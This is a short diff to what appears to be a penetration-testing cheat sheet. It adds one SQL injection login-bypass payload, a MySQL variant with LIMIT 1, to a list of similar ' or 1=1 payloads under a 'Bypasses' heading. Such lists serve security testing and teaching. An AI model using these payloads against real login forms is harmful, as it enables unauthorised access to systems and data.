@@ -191,6 +191,7 @@ SQLMap
 
 Bypasses  
   `' or 1=1;#`  (MySQL/MariaDB)
+  `' or 1=1 LIMIT 1;#`  (MySQL/MariaDB) --> If e.g. login expects only one entry in returned query
   `' or 1=1 LIMIT 1 --`  
   `' or 1=1 LIMIT 1 -- -`  
   `' or 1=1 LIMIT 1#`  
